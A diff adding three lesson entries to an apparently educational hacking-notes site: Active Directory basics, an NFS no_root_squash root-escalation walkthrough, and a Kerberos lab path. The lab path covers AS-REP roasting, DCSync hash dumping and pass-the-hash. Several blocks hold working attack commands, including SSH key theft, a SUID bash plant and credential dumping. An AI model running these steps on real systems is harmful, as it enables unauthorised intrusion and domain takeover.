@@ -9282,5 +9282,388 @@
         "code": "c:\\Users\\Administrator\\Desktop\\root.txt"
       }
     ]
+  },
+  {
+    "id": 36,
+    "slug": "ad-basics",
+    "title": "Active Directory - Basics",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/basics.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ad-intro-centralization",
+        "text": "The Necessity of Active Directory (AD) in Enterprise Networks"
+      },
+      {
+        "type": "order_block",
+        "id": "ad-scalability-logic",
+        "text": "In a small network of 5 computers, manual configuration is feasible. However, in a corporate environment with <highlight>100+ computers and 300+ users</highlight>, managing individual local accounts is impossible. <highlight>Active Directory (AD)</highlight> solves this by providing a centralized repository for all network data."
+      },
+      {
+        "type": "order_block",
+        "id": "dc-auth-mechanism",
+        "text": "The <highlight>Domain Controller (DC)</highlight> serves as the brain of the network. When a user enters credentials on any workstation, the machine does not check its own local database; it sends an <highlight>Authentication Request</highlight> to the DC, which verifies the user against the AD database."
+      },
+      {
+        "type": "section_heading",
+        "id": "ad-objects-and-containers",
+        "text": "AD Objects and Logical Organization"
+      },
+      {
+        "type": "order_block",
+        "id": "object-types-detailed",
+        "text": "Every entity in AD is an <highlight>Object</highlight>. This includes <highlight>Users</highlight> (identities), <highlight>Computers</highlight> (workstations/servers), and <highlight>Printers</highlight>. Managing these individually is inefficient, leading to the use of <highlight>Groups</highlight> for bulk permission assignment."
+      },
+      {
+        "type": "order_block",
+        "id": "ou-container-logic",
+        "text": "An <highlight>Organizational Unit (OU)</highlight> is a logical container (folder) used to categorize objects. While Groups are used for <highlight>Permissions</highlight> (e.g., 'who can access this file'), OUs are primarily used for <highlight>Management and Policy Application</highlight> (e.g., 'all computers in the HR_OU must have USBs disabled')."
+      },
+      {
+        "type": "section_heading",
+        "id": "gpo-enforcement",
+        "text": "Group Policy Objects (GPO) and Remote Administration"
+      },
+      {
+        "type": "order_block",
+        "id": "gpo-rulebook-analogy",
+        "text": "A <highlight>Group Policy Object (GPO)</highlight> is a virtual rulebook. Administrators create a GPO to define specific settings—such as password complexity requirements, software installation, or desktop wallpapers—and <highlight>link</highlight> them to an OU."
+      },
+      {
+        "type": "order_block",
+        "id": "gpo-vs-groups-conflict",
+        "text": "A common misconception is linking GPOs to Groups. In AD, <highlight>GPOs must be linked to OUs</highlight>. If a user is a member of multiple groups but resides in the 'IT_Dept_OU', only the GPOs linked to that OU (and its parent containers) will govern their system environment."
+      },
+      {
+        "type": "section_heading",
+        "id": "ad-hierarchy-forests",
+        "text": "Trees, Forests, and Trust Relationships"
+      },
+      {
+        "type": "order_block",
+        "id": "hierarchy-definitions",
+        "text": "A <highlight>Tree</highlight> is a set of domains sharing a contiguous DNS namespace. A <highlight>Forest</highlight> is the top-level container, acting as the security boundary for the entire organization. Multiple Forests can interact through <highlight>Trusts</highlight>."
+      },
+      {
+        "type": "order_block",
+        "id": "trust-types-security",
+        "text": "<highlight>One-Way Trust</highlight> allows one domain to trust another's users without reciprocal access. <highlight>Two-Way Trust</highlight> allows mutual resource sharing. <highlight>Transitive Trusts</highlight> create a chain of trust (If A trusts B and B trusts C, A trusts C), whereas <highlight>Non-Transitive Trusts</highlight> restrict access strictly to the two participating domains."
+      },
+      {
+        "type": "section_heading",
+        "id": "ad-security-and-exploitation",
+        "text": "Service Accounts and the Path to Domain Admin"
+      },
+      {
+        "type": "order_block",
+        "id": "service-account-vulnerability",
+        "text": "<highlight>Service Accounts</highlight> are often high-value targets because they run critical applications (SQL, IIS). To ensure 24/7 uptime, administrators rarely rotate their passwords, which are often <highlight>weak or default</highlight>, making them susceptible to Kerberoasting attacks."
+      },
+      {
+        "type": "order_block",
+        "id": "ntds-extraction-path",
+        "text": "The ultimate goal in AD hacking is <highlight>Domain Admin</highlight>. Attackers often seek intermediate privileges like <highlight>Backup Operator</highlight>. This role allows the bypass of security descriptors to copy the <highlight>ntds.dit</highlight> file from the DC, which contains hashes for all domain users, including the Domain Admin."
+      },
+      {
+        "type": "section_heading",
+        "id": "ad-reconnaissance-tools",
+        "text": "Enumeration and Path Analysis"
+      },
+      {
+        "type": "order_block",
+        "id": "recon-logic-bloodhound",
+        "text": "Enumeration involves mapping users, computers, and permissions. Tools like <highlight>BloodHound</highlight> use graph theory to find 'hidden' paths to Admin status, such as a user having <highlight>GenericWrite</highlight> permissions over a more privileged object, allowing for an immediate password reset or takeover."
+      }
+    ]
+  },
+  {
+    "id": 37,
+    "slug": "nfs",
+    "title": "NFS",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/nfs.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "nfs-intro",
+        "text": "NFS (Network File System) Exploitation & Privilege Escalation"
+      },
+      {
+        "type": "order_block",
+        "id": "nfs-definition",
+        "text": "NFS is a protocol used to share files over a network. Misconfigurations like <highlight>no_root_squash</highlight> allow low-privileged users to gain <highlight>root</highlight> access by manipulating file ownership."
+      },
+      {
+        "type": "section_heading",
+        "id": "nfs-enumeration",
+        "text": "Phase 1: Service Enumeration"
+      },
+      {
+        "type": "code_block",
+        "id": "nmap-nfs-scan",
+        "language": "bash",
+        "code": "nmap -p 2049 -sV <TARGET_IP>\n/usr/sbin/showmount -e <TARGET_IP>"
+      },
+      {
+        "type": "output_block",
+        "id": "showmount-output",
+        "language": "text",
+        "code": "Export list for <TARGET_IP>:\n/home *"
+      },
+      {
+        "type": "order_block",
+        "id": "enum-analysis",
+        "text": "Nmap confirms port 2049 is open. The showmount command reveals the /home directory is exported to everyone (*)."
+      },
+      {
+        "type": "section_heading",
+        "id": "nfs-mounting",
+        "text": "Phase 2: Mounting the Remote Share"
+      },
+      {
+        "type": "code_block",
+        "id": "mount-commands",
+        "language": "bash",
+        "code": "mkdir /tmp/nfs_mount\nsudo mount -t nfs <TARGET_IP>:/home /tmp/nfs_mount -nolock"
+      },
+      {
+        "type": "order_block",
+        "id": "mount-analysis",
+        "text": "The remote /home directory is mounted locally to /tmp/nfs_mount using the -nolock flag to bypass locking issues."
+      },
+      {
+        "type": "section_heading",
+        "id": "nfs-initial-access",
+        "text": "Phase 3: Gaining Initial Access (SSH Key Harvesting)"
+      },
+      {
+        "type": "code_block",
+        "id": "ssh-key-harvest",
+        "language": "bash",
+        "code": "ls -la /tmp/nfs_mount/cappucino/.ssh\ncp /tmp/nfs_mount/cappucino/.ssh/id_rsa .\nchmod 600 id_rsa\nssh -i id_rsa cappucino@<TARGET_IP>"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-access-analysis",
+        "text": "A private SSH key was found in the mounted share, providing a low-privileged shell as user cappucino."
+      },
+      {
+        "type": "section_heading",
+        "id": "nfs-privesc-config",
+        "text": "Phase 4: Privilege Escalation (no_root_squash)"
+      },
+      {
+        "type": "order_block",
+        "id": "privesc-theory",
+        "text": "The 'no_root_squash' option tells the server to trust the client's root user, allowing the creation of root-owned SUID binaries."
+      },
+      {
+        "type": "code_block",
+        "id": "suid-payload-creation",
+        "language": "bash",
+        "code": "sudo cp /bin/bash /tmp/nfs_mount/bash\nsudo chown root:root /tmp/nfs_mount/bash\nsudo chmod +s /tmp/nfs_mount/bash"
+      },
+      {
+        "type": "order_block",
+        "id": "payload-analysis",
+        "text": "A bash binary was copied to the mount, assigned root ownership, and given the SUID bit (+s) on the attacker machine."
+      },
+      {
+        "type": "section_heading",
+        "id": "root-execution",
+        "text": "Executing the Root Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "run-suid-bash",
+        "language": "bash",
+        "code": "./bash -p"
+      },
+      {
+        "type": "output_block",
+        "id": "whoami-root-output",
+        "language": "bash",
+        "code": "# whoami\nroot"
+      },
+      {
+        "type": "order_block",
+        "id": "exploit-final-analysis",
+        "text": "The SUID bash binary executes with root privileges on the target server, granting full administrative access."
+      },
+      {
+        "type": "section_heading",
+        "id": "nfs-summary",
+        "text": "Summary of NFS Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "nfs-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Scanned port 2049 to identify the NFS service",
+          "Listed exports using showmount to find accessible directories",
+          "Mounted the /home share to the local attacker machine",
+          "Harvested id_rsa keys to gain initial SSH access",
+          "Verified 'no_root_squash' by checking file ownership capabilities",
+          "Uploaded a bash binary and set the SUID bit as root",
+          "Executed the binary on the target with the -p flag",
+          "Obtained a root shell and captured the final flag"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 38,
+    "slug": "kerb-exp",
+    "title": "Kerberos Exploitation",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/kerb-exploit.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ad-compromise-intro",
+        "text": "Active Directory Exploitation: From AS-REP Roasting to Domain Admin"
+      },
+      {
+        "type": "order_block",
+        "id": "ad-overview",
+        "text": "This attack path demonstrates how misconfigured Kerberos settings and excessive user privileges can lead to a full domain compromise. Key techniques include <highlight>AS-REP Roasting</highlight>, <highlight>DCSync</highlight> via DRSUAPI, and <highlight>Pass-the-Hash</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-1-enumeration",
+        "text": "Phase 1: Domain Enumeration & User Discovery"
+      },
+      {
+        "type": "code_block",
+        "id": "kerbrute-enum",
+        "language": "bash",
+        "code": "./kerbrute_linux_amd64 userenum -d spookysec.local --dc <TARGET_IP> userlist.txt"
+      },
+      {
+        "type": "order_block",
+        "id": "enum-analysis",
+        "text": "Using Kerbrute for user enumeration helps identify valid usernames. Notable accounts discovered: <highlight>svc-admin</highlight> and <highlight>backup</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-2-asrep-roasting",
+        "text": "Phase 2: AS-REP Roasting (Targeting svc-admin)"
+      },
+      {
+        "type": "order_block",
+        "id": "asrep-theory",
+        "text": "AS-REP Roasting occurs when an account has <highlight>Do not require Kerberos pre-authentication</highlight> enabled. We can request an Authentication Service Response (AS-REP) without a password and crack the encrypted part offline."
+      },
+      {
+        "type": "code_block",
+        "id": "getnpusers-attack",
+        "language": "bash",
+        "code": "impacket-GetNPUsers spookysec.local/ -usersfile users.txt -format hashcat -dc-ip <TARGET_IP>"
+      },
+      {
+        "type": "output_block",
+        "id": "hashcat-output",
+        "language": "text",
+        "code": "$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:..."
+      },
+      {
+        "type": "order_block",
+        "id": "cracking-hash",
+        "text": "The retrieved hash is type <highlight>Kerberos 5, etype 23, AS-REP</highlight> (Mode 18200 in Hashcat). Cracking it reveals the password: <highlight>management2005</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-3-smb-exploitation",
+        "text": "Phase 3: SMB Share Enumeration & Credential Harvesting"
+      },
+      {
+        "type": "code_block",
+        "id": "smb-enum",
+        "language": "bash",
+        "code": "smbclient -L //<TARGET_IP>/ -U svc-admin%management2005\nsmbclient //<TARGET_IP>/backup -U svc-admin%management2005"
+      },
+      {
+        "type": "order_block",
+        "id": "backup-analysis",
+        "text": "Accessing the 'backup' share reveals a file containing a Base64 encoded string. Decoding it provides the password for the <highlight>backup</highlight> user."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-4-dcsync-attack",
+        "text": "Phase 4: Domain Privilege Escalation (DCSync)"
+      },
+      {
+        "type": "order_block",
+        "id": "dcsync-theory",
+        "text": "The <highlight>backup</highlight> user has replication privileges. Using the <highlight>DRSUAPI</highlight> method, we can impersonate a Domain Controller and request the entire <highlight>NTDS.DIT</highlight> database."
+      },
+      {
+        "type": "code_block",
+        "id": "secretsdump-execution",
+        "language": "bash",
+        "code": "impacket-secretsdump -dc-ip <TARGET_IP> 'spookysec.local/backup:password@<TARGET_IP>'"
+      },
+      {
+        "type": "output_block",
+        "id": "ntds-dump",
+        "language": "text",
+        "code": "Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::\n..."
+      },
+      {
+        "type": "section_heading",
+        "id": "phase-5-pth",
+        "text": "Phase 5: Final Compromise (Pass-the-Hash)"
+      },
+      {
+        "type": "order_block",
+        "id": "pth-theory",
+        "text": "With the Administrator's NTLM hash, we can authenticate without cracking the password using the <highlight>Pass-the-Hash</highlight> method."
+      },
+      {
+        "type": "code_block",
+        "id": "evil-winrm-login",
+        "language": "bash",
+        "code": "evil-winrm -i <TARGET_IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc"
+      },
+      {
+        "type": "section_heading",
+        "id": "flag-collection",
+        "text": "Capturing the Flags"
+      },
+      {
+        "type": "code_block",
+        "id": "read-flags",
+        "language": "powershell",
+        "code": "type C:\\Users\\svc-admin\\Desktop\\user.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt"
+      },
+      {
+        "type": "section_heading",
+        "id": "ad-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "ad-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Enumerated users using Kerbrute to find svc-admin and backup",
+          "Performed AS-REP Roasting on svc-admin (Pre-Auth Disabled)",
+          "Cracked the krb5asrep hash using Hashcat mode 18200",
+          "Exploited SMB shares to find Base64 encoded credentials for the backup user",
+          "Executed a DCSync attack using DRSUAPI protocol to dump NTDS.DIT",
+          "Identified the Administrator's NTLM hash from the dump",
+          "Used Pass-the-Hash with Evil-WinRM to gain a Domain Admin shell",
+          "Collected user.txt and root.txt flags"
+        ]
+      }
+    ]
   }
 ]
